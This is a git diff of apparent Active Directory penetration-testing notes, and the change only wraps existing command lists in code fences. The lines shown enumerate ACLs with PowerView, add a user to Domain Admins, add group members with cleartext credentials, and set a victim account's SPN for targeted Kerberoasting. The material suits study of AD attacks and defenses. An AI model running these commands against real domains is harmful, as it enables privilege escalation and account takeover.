@@ -479,9 +479,9 @@ This script grants Alice full control over the user JohnDoe.
 
 <img width="5808" height="4584" alt="ACL_Mindmap" src="https://github.com/user-attachments/assets/3e33fe34-2940-4f07-b472-372ee0d25a66" />
 
-
-### Commands 
-
+ 
+### Commands ACL
+```
 **Get the ACLs associated with the specified object**
 * Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
 
@@ -505,6 +505,7 @@ This script grants Alice full control over the user JohnDoe.
 
 **Get the ACLs associated with the specified path**
 * Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
+```
 
 ### DACL abuse
 
@@ -533,7 +534,7 @@ When misconfigured, ACEs can be abused to operate lateral movement or privilege 
 ### AddMember
 This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, Self, AllExtendedRights or Self-Membership, over the target group.
 The attacker can add a user/group/computer to a group.
-
+```
 **Windows**
 * net group 'Domain Admins' 'user' /add /domain
 
@@ -551,6 +552,7 @@ With net and cleartext credentials (will be prompted)
 
 With net and cleartext credentials
 * net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
+```
 
 ### ForceChangePassword
 This abuse can be carried out when controlling an object that has a GenericAll, AllExtendedRights or User-Force-Change-Password over the target user.
@@ -561,6 +563,7 @@ This abuse can be carried out when controlling an object that has a GenericAll, 
 The attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting. This technique is called Targeted Kerberoasting.
 
 **Windows**
+```
 1. Make sur that the target account has no SPN
 - Get-DomainUser 'victimuser' | Select serviceprincipalname
 
@@ -574,6 +577,7 @@ The attacker can add an SPN (ServicePrincipalName) to that account. Once the acc
 4. Clear the SPNs of the target account
 - $User | Select serviceprincipalname
 - Set-DomainObject -Identity victimuser -Clear serviceprincipalname
+```
 
 ### Grant rights
 This abuse can be carried out when controlling an object that has WriteDacl over another object.
